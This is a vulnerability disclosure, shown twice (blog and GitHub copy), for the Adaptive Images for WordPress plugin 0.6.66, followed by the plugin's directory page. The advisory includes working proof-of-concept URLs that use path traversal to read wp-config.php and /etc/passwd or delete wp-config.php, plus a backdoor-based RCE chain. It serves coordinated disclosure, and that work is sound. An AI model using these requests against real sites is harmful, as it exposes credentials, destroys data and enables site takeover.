=== Content from markgruffer.github.io_ec5f2f40_20250121_000119.html ===

[Mark Gruffer](/)

[About](/about/)

# Adaptive images for Wordpress 0.6.66: LFI, arbitrary file deletion and RCE.

Jul 19, 2019

# LFI (Local file inclusion), Arbitrary file deletion and RCE in [Adaptive Images for WordPress](https://wordpress.org/plugins/adaptive-images/) plugin.

This plugin, developed by [Nevma](http://www.nevma.gr/) is used to serve images in Wordpress based on device resolution, allowing an on-the-fly resize.
It is useful to decrease the page load for mobile devices.

The analyzed version is **0.6.66** on a fresh WordPress installation 5.2.2.

Due to an exposed variable an unauthenticated attacker can exploit a vulnerability that can lead to a LFI (Local File Inclusion) and to Arbitrary File Deletion.

Sensible system and Wordpress file can be easily exfiltrated and the two vulnerabilities can be used to obtain RCE (Remote Command Execution).

## **INTRO**

**Adaptive Images for WordPress** serves images through a PHP script, `adaptive-images-script.php`.

All requests made to image assets that appear in specific folders (the plugin settings allow to change these folders) are redirected through this script that eventually manipulate the image before serving it.

At **line 877** the plugin settings are collected:

```
  $settings = adaptive_images_script_get_settings();

```

This method at **line 62** checks if the `$_REQUEST['adaptive-images-settings']` is present and if not it overrides and composes it according the default configuration.

```

    function adaptive_images_script_get_settings () {

        // Setup script settings.

        if ( ! isset( $_REQUEST['adaptive-images-settings'] ) ) {

    ...

    // Setup script settings and save the in request scope.

    $_REQUEST['adaptive-images-settings'] = array(
        'debug'          => $debug,
        'resolutions'    => $resolutions,
        'cache_dir'      => $cache_dir,
        'jpg_quality'    => $jpg_quality,
        'png8'           => $png8,
        'sharpen'        => $sharpen,
        'watch_cache'    => $watch_cache,
        'browser_cache'  => $browser_cache,
        'request_uri'    => $request_uri,
        'source_file'    => $source_file,
        'wp_content'     => $wp_content_dir,
        'client_width'   => $client_width,
        'hidpi'          => $hidpi,
        'pixel_density'  => $pixel_density,
        'resolution'     => $resolution
    );

```

At the end of the method the function simply return the `$_REQUEST['adaptive-images-settings']` variable.

```
  return $_REQUEST['adaptive-images-settings'];

```

This logic allows any visitor to set and override the `$_REQUEST['adaptive-images-settings']` just passing it to the request.

**Having control on this variable allows an attacker to exploit two major vulnerabilities.**

## **LFI**

The parameter `$_REQUEST['adaptive-images-settings']['source_file']` allows an attacker to set in an arbitrary way the file requested that will be served from the script.

Even if it is not possible to manipulate the `Content-Type` header, the script will generate a malformed image that contains the requested file.

This vulnerability in combination with other server misconfiguration can lead to RCE (Remote Command Execution) using log poisoning technique, /proc/self/environ technique and others.

### **POC**

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=../../../wp-config.php`

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=/etc/passwd`

*The image used to trigger the vulnerability should exist.*

## **Arbitrary File Deletion**

The plugin contains a cache mechanism that allows the generated resized images to be saved and cached to prevent excessive resources usage.

As every cache mechanism a file should be deleted if the source is newer than the cache file.

**This feature can be abused to delete an arbitrary file accessible from the Wordpress installation.**

On **line 977** is called the function that removes a stale cache image:

```
    // Locate cached image.

    $cache_file = $settings['wp_content'] . '/' . $settings['cache_dir'] . '/' . $settings['resolution'] . $settings['request_uri'];

    // Check if cached image if stale and relete it if so.

    if ( file_exists( $cache_file ) ) {

        // Check if cached image is stale and delete it if so.

        if ( $settings['watch_cache'] ) {

            adaptive_images_delete_stale_cache_image( $settings['source_file'], $cache_file, $settings['resolution'] );

        }

    }

```

Every variable used in this code is controlled by the aforementioned `$_REQUEST['adaptive-images-settings']` variable.

The `adaptive_images_delete_stale_cache_image` function just checks if the `$cache_files` exists and if it is newer than the original one.

The only condition to successfully exploit this vulnerability is that the file that we pass as `$source_file` is newer than the file that
we pass as `$cache_file`.

```
    function adaptive_images_delete_stale_cache_image ( $source_file, $cache_file, $resolution ) {

        if ( file_exists( $cache_file ) ) {

            // Check image file timestamp.

            if ( filemtime( $cache_file ) >= filemtime( $source_file ) ) {

                return $cache_file;

            }

            unlink( $cache_file );
        }

    }

```
### **POC**

Using relative paths we set as `$source_file` an image (or any other file) that exists in the website and as `$cache_file` (our target) the `wp-config.php`.

In this way it is almost certain that the image is more recent than the target file.

Some other variables should be manipulated to pass some checks and build the correct path of the target file.

*This POC deletes the `wp-config.php`, test it carefully.*

`http://wp-vulnerable/wp-content/uploads/2019/07/image.jpeg?adaptive-images-settings[source_file]=../../../wp-content/uploads/2019/07/image.jpeg&adaptive-images-settings[resolution]=&resolution=16000&adaptive-images-settings[wp_content]=.&adaptive-images-settings[cache_dir]=../../..&adaptive-images-settings[request_uri]=wp-config.php&adaptive-images-settings[watch_cache]=1`

## **BONUS: LFI + Arbitrary file deletion = RCE**

Combining the previous two vulnerabilities an attacker can obtain a bold (and not really stealth) Remote Code Execution on the server.

This is the exploit process:

1. Dump the current wp-config.php
2. Delete the current wp-config.php
3. Install a fake WordPress alongside the real one (DB credentials are known, a random db\_prefix should be chosen to not overwrite the current installation).
4. Log in the fake WordPress to patch a plugin or theme file to set up a backdoor
5. Use the backdoor to restore the previous wp-config.php and remove the fake WordPress installation from the database.

This process can be automated and executed in less than 1 minute.
During the process the website will not be reachable ([exploit](https://github.com)).

## **Time Line**

| Date | What |
| --- | --- |
| 2019/07/08 | Vulnerability reported to plugin developer company using the email found in code. No response. |
| 2019/07/11 | Vulnerability reported directly to plugin developer. |
| 2019/07/11 | The vulnerability was verified by the plugin developer. |
| 2019/07/11 | A fix was released in version [0.6.7](https://wordpress.org/plugins/adaptive-images/). |
| 2019/07/19 | Public disclosure. |

Special thanks to Takis @ Nevma for his availability and for the quick release of the fix.

## Mark Gruffer

* Mark Gruffer
* mark.gruffer@tuta.io

* [markgruffer](https://github.com/markgruffer)

Mark Gruffer. Independent security researcher.



=== Content from github.com_11105df8_20250121_000118.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarkgruffer%2Fmarkgruffer.github.io%2Fblob%2Fmaster%2F_posts%2F2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarkgruffer%2Fmarkgruffer.github.io%2Fblob%2Fmaster%2F_posts%2F2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=markgruffer%2Fmarkgruffer.github.io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[markgruffer](/markgruffer)
/
**[markgruffer.github.io](/markgruffer/markgruffer.github.io)**
Public

* [Notifications](/login?return_to=%2Fmarkgruffer%2Fmarkgruffer.github.io) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fmarkgruffer%2Fmarkgruffer.github.io)
* [Star
   0](/login?return_to=%2Fmarkgruffer%2Fmarkgruffer.github.io)

* [Code](/markgruffer/markgruffer.github.io)
* [Issues
  0](/markgruffer/markgruffer.github.io/issues)
* [Pull requests
  3](/markgruffer/markgruffer.github.io/pulls)
* [Actions](/markgruffer/markgruffer.github.io/actions)
* [Projects
  0](/markgruffer/markgruffer.github.io/projects)
* [Security](/markgruffer/markgruffer.github.io/security)
* [Insights](/markgruffer/markgruffer.github.io/pulse)

Additional navigation options

* [Code](/markgruffer/markgruffer.github.io)
* [Issues](/markgruffer/markgruffer.github.io/issues)
* [Pull requests](/markgruffer/markgruffer.github.io/pulls)
* [Actions](/markgruffer/markgruffer.github.io/actions)
* [Projects](/markgruffer/markgruffer.github.io/projects)
* [Security](/markgruffer/markgruffer.github.io/security)
* [Insights](/markgruffer/markgruffer.github.io/pulse)

## Files

 master
## Breadcrumbs

1. [markgruffer.github.io](/markgruffer/markgruffer.github.io/tree/master)
2. /[\_posts](/markgruffer/markgruffer.github.io/tree/master/_posts)
/
# 2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown

Copy path Blame  Blame
## Latest commit

## History

[History](/markgruffer/markgruffer.github.io/commits/master/_posts/2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown)185 lines (113 loc) · 7.35 KB master
## Breadcrumbs

1. [markgruffer.github.io](/markgruffer/markgruffer.github.io/tree/master)
2. /[\_posts](/markgruffer/markgruffer.github.io/tree/master/_posts)
/
# 2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown

Top
## File metadata and controls

* Preview
* Code
* Blame

185 lines (113 loc) · 7.35 KB[Raw](https://github.com/markgruffer/markgruffer.github.io/raw/refs/heads/master/_posts/2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown)

| layout | title | date |
| --- | --- | --- |
| post | Adaptive images for Wordpress 0.6.66: LFI, arbitrary file deletion and RCE. | 2019-07-19 04:01:00 +0000 |

# LFI (Local file inclusion), Arbitrary file deletion and RCE in [Adaptive Images for WordPress](https://wordpress.org/plugins/adaptive-images/) plugin.

This plugin, developed by [Nevma](http://www.nevma.gr/) is used to serve images in Wordpress based on device resolution, allowing an on-the-fly resize.
It is useful to decrease the page load for mobile devices.

The analyzed version is **0.6.66** on a fresh WordPress installation 5.2.2.

Due to an exposed variable an unauthenticated attacker can exploit a vulnerability that can lead to a LFI (Local File Inclusion) and to Arbitrary File Deletion.

Sensible system and Wordpress file can be easily exfiltrated and the two vulnerabilities can be used to obtain RCE (Remote Command Execution).

## **INTRO**

**Adaptive Images for WordPress** serves images through a PHP script, `adaptive-images-script.php`.

All requests made to image assets that appear in specific folders (the plugin settings allow to change these folders) are redirected through this script that eventually manipulate the image before serving it.

At **line 877** the plugin settings are collected:

```
  $settings = adaptive_images_script_get_settings();
```

This method at **line 62** checks if the `$_REQUEST['adaptive-images-settings']` is present and if not it overrides and composes it according the default configuration.

```
    function adaptive_images_script_get_settings () {

        // Setup script settings.

        if ( ! isset( $_REQUEST['adaptive-images-settings'] ) ) {

    ...

    // Setup script settings and save the in request scope.

    $_REQUEST['adaptive-images-settings'] = array(
        'debug'          => $debug,
        'resolutions'    => $resolutions,
        'cache_dir'      => $cache_dir,
        'jpg_quality'    => $jpg_quality,
        'png8'           => $png8,
        'sharpen'        => $sharpen,
        'watch_cache'    => $watch_cache,
        'browser_cache'  => $browser_cache,
        'request_uri'    => $request_uri,
        'source_file'    => $source_file,
        'wp_content'     => $wp_content_dir,
        'client_width'   => $client_width,
        'hidpi'          => $hidpi,
        'pixel_density'  => $pixel_density,
        'resolution'     => $resolution
    );
```

At the end of the method the function simply return the `$_REQUEST['adaptive-images-settings']` variable.

```
  return $_REQUEST['adaptive-images-settings'];
```

This logic allows any visitor to set and override the `$_REQUEST['adaptive-images-settings']` just passing it to the request.

**Having control on this variable allows an attacker to exploit two major vulnerabilities.**

## **LFI**

The parameter `$_REQUEST['adaptive-images-settings']['source_file']` allows an attacker to set in an arbitrary way the file requested that will be served from the script.

Even if it is not possible to manipulate the `Content-Type` header, the script will generate a malformed image that contains the requested file.

This vulnerability in combination with other server misconfiguration can lead to RCE (Remote Command Execution) using log poisoning technique, /proc/self/environ technique and others.

### **POC**

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=../../../wp-config.php`

`http://wp-vulnerable/wp-content/uploads/2019/05/image.jpg?adaptive-images-settings[source_file]=/etc/passwd`

*The image used to trigger the vulnerability should exist.*

## **Arbitrary File Deletion**

The plugin contains a cache mechanism that allows the generated resized images to be saved and cached to prevent excessive resources usage.

As every cache mechanism a file should be deleted if the source is newer than the cache file.

**This feature can be abused to delete an arbitrary file accessible from the Wordpress installation.**

On **line 977** is called the function that removes a stale cache image:

```
    // Locate cached image.

    $cache_file = $settings['wp_content'] . '/' . $settings['cache_dir'] . '/' . $settings['resolution'] . $settings['request_uri'];

    // Check if cached image if stale and relete it if so.

    if ( file_exists( $cache_file ) ) {

        // Check if cached image is stale and delete it if so.

        if ( $settings['watch_cache'] ) {

            adaptive_images_delete_stale_cache_image( $settings['source_file'], $cache_file, $settings['resolution'] );

        }

    }
```

Every variable used in this code is controlled by the aforementioned `$_REQUEST['adaptive-images-settings']` variable.

The `adaptive_images_delete_stale_cache_image` function just checks if the `$cache_files` exists and if it is newer than the original one.

The only condition to successfully exploit this vulnerability is that the file that we pass as `$source_file` is newer than the file that
we pass as `$cache_file`.

```
    function adaptive_images_delete_stale_cache_image ( $source_file, $cache_file, $resolution ) {

        if ( file_exists( $cache_file ) ) {

            // Check image file timestamp.

            if ( filemtime( $cache_file ) >= filemtime( $source_file ) ) {

                return $cache_file;

            }

            unlink( $cache_file );
        }

    }
```

### **POC**

Using relative paths we set as `$source_file` an image (or any other file) that exists in the website and as `$cache_file` (our target) the `wp-config.php`.

In this way it is almost certain that the image is more recent than the target file.

Some other variables should be manipulated to pass some checks and build the correct path of the target file.

*This POC deletes the `wp-config.php`, test it carefully.*

`http://wp-vulnerable/wp-content/uploads/2019/07/image.jpeg?adaptive-images-settings[source_file]=../../../wp-content/uploads/2019/07/image.jpeg&adaptive-images-settings[resolution]=&resolution=16000&adaptive-images-settings[wp_content]=.&adaptive-images-settings[cache_dir]=../../..&adaptive-images-settings[request_uri]=wp-config.php&adaptive-images-settings[watch_cache]=1`

## **BONUS: LFI + Arbitrary file deletion = RCE**

Combining the previous two vulnerabilities an attacker can obtain a bold (and not really stealth) Remote Code Execution on the server.

This is the exploit process:

1. Dump the current wp-config.php
2. Delete the current wp-config.php
3. Install a fake WordPress alongside the real one (DB credentials are known, a random db\_prefix should be chosen to not overwrite the current installation).
4. Log in the fake WordPress to patch a plugin or theme file to set up a backdoor
5. Use the backdoor to restore the previous wp-config.php and remove the fake WordPress installation from the database.

This process can be automated and executed in less than 1 minute.
During the process the website will not be reachable ([exploit](https://github.com)).

## **Time Line**

| Date | What |
| --- | --- |
| 2019/07/08 | Vulnerability reported to plugin developer company using the email found in code. No response. |
| 2019/07/11 | Vulnerability reported directly to plugin developer. |
| 2019/07/11 | The vulnerability was verified by the plugin developer. |
| 2019/07/11 | A fix was released in version [0.6.7](https://wordpress.org/plugins/adaptive-images/). |
| 2019/07/19 | Public disclosure. |

Special thanks to Takis @ Nevma for his availability and for the quick release of the fix.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from wordpress.org_38b919f4_20250121_000120.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Adaptive Images for WordPress

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fadaptive-images&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fadaptive-images&locale=en_US)

Search plugins

![](https://ps.w.org/adaptive-images/assets/banner-772x250.png?rev=1138283)
![](https://ps.w.org/adaptive-images/assets/icon-256x256.png?rev=1138642)
# Adaptive Images for WordPress

By [Nevma](http://www.nevma.gr)

[Download](https://downloads.wordpress.org/plugin/adaptive-images.0.6.73.zip)

* [Details](https://wordpress.org/plugins/adaptive-images/#description)
* [Reviews](https://wordpress.org/plugins/adaptive-images/#reviews)
* [Installation](https://wordpress.org/plugins/adaptive-images/#installation)
* [Development](https://wordpress.org/plugins/adaptive-images/#developers)

[Support](https://wordpress.org/support/plugin/adaptive-images/)

## Description

#### Adaptive Images

Resizes and optimizes images delivered to mobile devices, in a transparent way, so that the total download time is dramatically reduced. It works as a filter between your WordPress website and the devices and seves smaller images to them.

Note that this is not a CSS nor a responsive images solution. It does not affect your themes layout and style. It simply sends smaller images to the devices without them noticing it!

#### Fundamental goals

1. Reduce the total download time of a web page in mobile devices dramatically.
2. Work transparantly and unobtrusively by being independant of your theme layout and style.
3. Be agnostic of the yet not-standardised `picture` element or HTML the img `srcset` attribute.

#### Side benefits

1. Respects search engines and sends them the orginal version of each image.
2. If it does not recognise a device size it falls back to the original image size.
3. It is lightweight, because it does not need to load the whole WordPress environment every time it server an image request.

#### Supported formats

* JPEG
* PNG
* GIF (not animated)

#### NOT Supported formats

* WEBP
* GIF (animated)

#### CDN/Varnish/Nginx/external caching services

Since version 0.6.0 CDN/Varnish/external caching service support has been added as an option, in an ***experimental*** mode. This means: i) it is not thorougly tested yet ii) however, it works in almost all test cases so far iii) it bears no dangers to your installation iv) it adds a special url parameter to your image urls, so it is slightly obtrusive.

* Tested with MaxCDN, Varnish and Nginx up to now.
* Cannot handle CSS background images in this mode (yet).

Cannot work, not even in experimental mode, with CDNs which use a different subdomain for images, because these setups completely bypass WordPress when delivering images. Feel free to ask for details on this in the support forum.

#### Default breakpoints

* 1024px wide screens
* 640px wide screens
* 480px wide screens

Since version 0.5.0 and upwards it is configurable whether the plugin should take into account the landscape or the portrait orientation of each device. HiDPI (high device pixel density or retina) screens are supported too.

#### How to test

The esiest way to test is with your browser's device emulation mode (Responsive Design Mode) in it' Developer Tools. You can check this out in this video https://www.youtube.com/watch?v=hCAC1XUUOvw/ as an example.

1. Test with a tool like Webpagetest http://www.webpagetest.org/. Make sure you set the “Emulate Mobile Browser” setting in the “Advanced Settings” > “Chrome” tab.
2. Test with an actual mobile device, a smartphone or tablet. Watch your website load in a snap.
3. Check the `/wp-contents/cache` directory to see the `/adaptive-images` directory and its contents. This is where the resized images are kept and cached by default.
4. View an image straight from a browser and add a "?debug=true" at the end of the url like this "http://www.website.com/wp-content/uploads/2015/01/image.jpg?debug=true". This verifies that the plugin is working and should print useful debug information. If you keep seeing your image, then the plugin is not working as expected and the cause is probably a failure to update the .htaccess file properly.
5. Add a "?debug=original" at the end of the url of an image and you will see the orginal version of the image even when a smaller version of it should have been shown.

#### Incompatibilities and issues

* The plugin supports Nginx, if it is used as the main server, not as a caching server, but the server’s configuration file must be manually configured like this:

  `location / {

  rewrite \.(?:jpe?g|gif|png)$ /wp-content/plugins/adaptive-images/adaptive-images-script.php;

  }`
* Windows IIS is not supported, but could be manually configured. Any IIS experts are welcome to contribute.
* Cannot work, not even in experimental mode, with CDNs which use a different subdomain for images.
* When using HTTPS/SSL make sure that you update all your website urls and also the urls in your WordPress General

  settings page, otherwise the plugin will not be able to locate your images.
* WordPress Multisite (Mu) is not supported (some plans for future support are being discussed).

#### Stuff to keep in mind

* The plugin needs to add a little bit of code to your `.htaccess` file in order to function properly. It removes this code once disabled. If you are not cool with that, then… tough luck!
* The plugin does not care whether the device is actually mobile or not. It checks the device screen resolution. If you have set your breakpoints big enough then it should work just as good for desktop devices as well. However, it targets mostly the mobile ones.
* The resized versions of the pictures are kept in a special directory in the `/wp-content/cache` directory. This causes some storage overhead. It is up to you to judge whether this overhead is a sustainable option in your hosting environment. Usually it is not even remotely compared to the size of your original images directories.
* The plugin does not help with (nor hinder) art direction. Simple as that. Art direction https://usecases.responsiveimages.org/#art-direction in responsive images is an entirely different, yet important, problem. This plugin does not tackle with it. But it works in a supplementary way without interfering with other solutions that do. This means that you can combine it with any art direction solution.

#### Credits

* The plugin was originally based on the WP-Resolutions plugin https://github.com/JorgenHookham/WP-Resolutions/, but since version 0.3.0 it is a complete rewrite!
* Both plugins, WP-Resolutions and this one, have borrowed ideas from the Adaptive Images http://adaptive-images.com/ solution, specially adapted for WordPress.
* Many special thanks to my good friend and colleague Antonis Zachopoulos for the countless times that he provided feedback, ideas and debugging hints.
* Many thanks to @railgunner for the initial idea on the CDN/Varnish/external caching service feature in the plugin support forum. It showed the way that it was indeed possible!
* Thank you AJ at WpFASTER.org for being keen to test the above feature in a real environment.
* Thank you to the guys over at the Pressidium team for helping with debugging the CDN/Varnish/external caching service feature and providing test environments.
* Thank you Andy Gray for helping debugging the weird filesystem path issues in managed hosting environments.
* Thank you @milenoi2016 for helping sort out one of the many cases of WordPress directories setup.
* Thank you @minorgod for the Windows path fix.
* Thank you Mark Gruffer for the global request variable exposure hint.
* Thank you @timholz for the SameSite cookie hint.
* Thank you @blackcapdesign for spotting the regular expression issue in version 0.6.70 and helping debug it.
* Lastly, a million thanks to all of you who provided useful feedback in the early versions of the plugin, where the inevitable glitches, due to server environment variations, were more than a few.

Please, do let us know how the plugin works (or doesn’t work) for you. We love comments and creative feedback!

## Screenshots

* [![](https://ps.w.org/adaptive-images/assets/screenshot-1.png?rev=1188722)](https://ps.w.org/adaptive-images/assets/screenshot-1.png?rev=1188722)

  Plugin settings page in the admin area.
* [![](https://ps.w.org/adaptive-images/assets/screenshot-2.png?rev=1158906)](https://ps.w.org/adaptive-images/assets/screenshot-2.png?rev=1158906)

  Resized versions of your images are cached by default in `/wp-content/cache/adaptive-images`.
* [![](https://ps.w.org/adaptive-images/assets/screenshot-3.png?rev=1138765)](https://ps.w.org/adaptive-images/assets/screenshot-3.png?rev=1138765)

  Total web page load time is reduced dramatically on a mobile device (tested in http://webpagetest.org/).
* [![](https://ps.w.org/adaptive-images/assets/screenshot-4.png?rev=1158906)](https://ps.w.org/adaptive-images/assets/screenshot-4.png?rev=1158906)

  Each device is served an image resized its real dimensions, therefore a lot smaller in total size.

## Installation

#### Usual process

1. Install the plugin via “Plugins > Add New”.
2. Activate the plugin.
3. Go to its settings and save them!

If you have renamed the /wp-content directory and/or the /wp-content/uploads directory to something other than the default, then you must manually make the same edit in the "Watched directories" property in the plugin settings page.

Deactivate the plugin to disable it, if you wish. Its settings will be kept in the database. Then activate the plugin to enable it. Delete it and it cleans up after itself and then is gone. So simple.

## FAQ

### Support

Should you encounter any problem or issue with the plugin or if you have any questions about its usage, please, do not hesitate to contact the plugin support and try to explain your case as fully as possible.

We are set on making the Adaptive Images plugin work in as many environments and setup combinations it takes and we would love to have your feedback and help on this.

### What’s the story?

First came the Adaptive Images solution http://adaptive-images.com/ which is still there and works on its own. Then came the WP-Resolutions plugin https://github.com/JorgenHookham/WP-Resolutions. But it is not in the WordPress plugin repository anymore and the Github version is not compatible with the latest WordPress versions. So we are updating and maintaining it. Many under the hood changes have taken place, but the overall functionality is the same.

Since version 0.5.0 the plugin has been completely rewritten, in order to not rely on the Adaptive Images solution, which was released under a CC-BY license that is not compatible with the GPL. This problem has now been overcome and the part that used to rely on the Adaptive Images is brand new!

### Is this plugin heavy?

Well, not much really. The image resizing process is not computationally negligible, but the images are only resized when they are first requested and then they are cached. However, it must be noted that the images in the watched directories, the ones the plugin is responsible for resizing and delivering, are ultimately delivered by a PHP script and not a generic server process!

So actually one has to decide on a balance between creating and storing too many image sizes in contrast to burdening their server resources.

## Reviews

![](https://secure.gravatar.com/avatar/61acc9ec0c96eee68c7e5510051310ccab7053c86d6dad919d86214bc6aace03?s=60&d=retro&r=g)
### [Outstanding!!](https://wordpress.org/support/topic/outstanding-591/)

[kgbgrafix](https://profiles.wordpress.org/kgbgrafix/ "Posts by kgbgrafix")
May 27, 2023
1 reply

Does exactly what it says. Set-up takes less than a minute. Results are instant. Thank you! A+++

![](https://secure.gravatar.com/avatar/1edf68def693f04ccfb68622d4820fd549e933155e0a498b820762279c197543?s=60&d=retro&r=g)
### [Great, helpful support](https://wordpress.org/support/topic/great-helpful-support-2/)

[Psandeman](https://profiles.wordpress.org/psandeman/ "Posts by Psandeman")
July 22, 2022
1 reply

An excellent plugin as mobile loading times are increasingly important for SEO. Got a very helpful response to support query from the author.

![](https://secure.gravatar.com/avatar/9c7be41168a828b3275c2a320c1b629708f7a7af499541029a40e662b9320a3e?s=60&d=retro&r=g)
### [Brakes all images](https://wordpress.org/support/topic/brakes-all-images/)

[metaeditor](https://profiles.wordpress.org/metaeditor/ "Posts by metaeditor")
December 15, 2020
1 reply

Good Idea, worked some time ago. Now it brakes all my images. The htacess entry that produced by this Plugin was the problem. Moved to other image optimization strategy and wepb. Dont have the time to fix that single Plugin problem.

![](https://secure.gravatar.com/avatar/422f7a5a3c870cb3ed3619e0e6901b2d1f6cb9a9854844d7d803609b560698cb?s=60&d=retro&r=g)
### [When it works, it works well](https://wordpress.org/support/topic/when-it-works-it-works-well-2/)

[Zalium](https://profiles.wordpress.org/zalium/ "Posts by Zalium")
May 22, 2020
1 reply

Struggling to get it working on one site, but works brilliantly on another site, much better than WP native responsive image solution.

![](https://secure.gravatar.com/avatar/07926697803007a7874d5594cfb13547f1009322e49e274de6430457770cf197?s=60&d=retro&r=g)
### [barely works, or doesnt work](https://wordpress.org/support/topic/barely-works-or-doesnt-work/)

[garg4m3l](https://profiles.wordpress.org/garg4m3l/ "Posts by garg4m3l")
October 23, 2019
1 reply

i think it worked for one of my images? and only generated 1024. didnt generate more sizes even when i accessed it from 200×200 phone.
so:
didnt resize my images, especially featured images
doesnt have srcset
doesnt use custom sizes
bad for seo cuz it will index each of ‘cached’ images as it replaces link in source code. srcset always points search engines to original image instead
sry but this is awful

![](https://secure.gravatar.com/avatar/98194cf751edca97ebe819f9ffa457786db705062d1545dd5ef3917cf7867e79?s=60&d=retro&r=g)
### [Works great, does wonders !](https://wordpress.org/support/topic/works-great-does-wonders/)

[Yves](https://profiles.wordpress.org/yves/ "Posts by Yves")
September 19, 2019
1 reply

This plugin works just as advertised, and it allows to use even non responsive Gutenberg blocks. The best of both worlds !

